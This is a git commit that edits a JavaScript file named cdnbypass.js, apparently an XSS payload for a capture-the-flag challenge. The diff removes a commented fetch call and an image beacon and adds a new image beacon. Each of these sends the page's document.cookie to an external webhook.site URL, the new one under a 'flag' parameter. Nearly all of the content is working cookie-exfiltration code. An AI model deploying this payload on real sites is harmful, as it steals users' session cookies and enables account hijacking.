0c27401ae99d0fe1cc903842e9aa9bc22a1cdef9
unsbotch <157278355+unsbotch@users.noreply.github.com>
2024-05-04 04:27:19 +0500

    Update cdnbypass.js

--- cdnbypass.js
+++ cdnbypass.js
@@ -1,3 +1,1 @@
-// fetch("https://webhook.site/0739f9c6-a1fe-4fa4-8fa2-2a0489072c0f/?cookie=" + document.cookie);
-
-var i=new Image;i.src="https://webhook.site/0739f9c6-a1fe-4fa4-8fa2-2a0489072c0f/?cookie="+document.cookie;
+var i=new Image;i.src="https://webhook.site/0739f9c6-a1fe-4fa4-8fa2-2a0489072c0f?flag=" +document.cookie;
